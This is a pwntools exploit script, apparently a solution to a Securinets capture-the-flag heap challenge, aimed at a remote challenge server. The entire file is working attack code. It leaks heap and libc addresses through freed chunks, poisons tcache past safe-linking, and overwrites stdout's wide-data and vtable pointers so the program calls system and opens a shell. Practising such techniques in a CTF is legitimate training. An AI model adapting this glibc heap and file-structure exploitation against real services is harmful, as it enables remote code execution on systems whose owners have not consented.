from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			b* puts
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc pwned.securinets-tekup.tech 6666"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

def malloc(size,input):
	p.sendline("1")
	p.recvuntil("Size : ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(input)
	sleep(0.1)


def delete(index):
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline(str(index))

def edit(index,input):
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Content: ")
	p.send(input)
	sleep(0.1)

def show(index):
	p.sendline("4")
	p.recvuntil(b"Index: ")
	p.sendline(str(index))


############### main exploit    ###############
for i in range(8):
	malloc(0x80,"aaa")
malloc(0x10,b"bbbb")
for i in range(8):
	delete(i)
show(0)
p.recvuntil("Content: ")
heap=u64(p.recv(5)+b"\x00"*3)
print(hex(heap))

show(7)
p.recvuntil("Content: ")
libc.address=u64(p.recv(6)+b"\x00"*2)-0x1f6ce0
print(hex(libc.address))
stdout=libc.address+0x1f7780
edit(6,p64((stdout+0xa0)^heap))
widedata= (heap<<12)-0x68+0x820
widedata=(heap<<12)+0x828-0xe0
vtable=libc.address+0x1f30a0 # +0x38 
malloc(0x80,p64(libc.symbols["system"])+p64((heap<<12)+0x820-0x68))
malloc(0x80,"a")
payload2=p64(widedata)+p64(0)*6+p64(vtable)
malloc(0x40,"a")
malloc(0x40,"a")
delete(11)
delete(12)
edit(12,p64(stdout^heap))
malloc(0x40,"a")
#debug()

malloc(0x40,b"\x04;sh\x00")

edit(10,payload2)

p.interactive()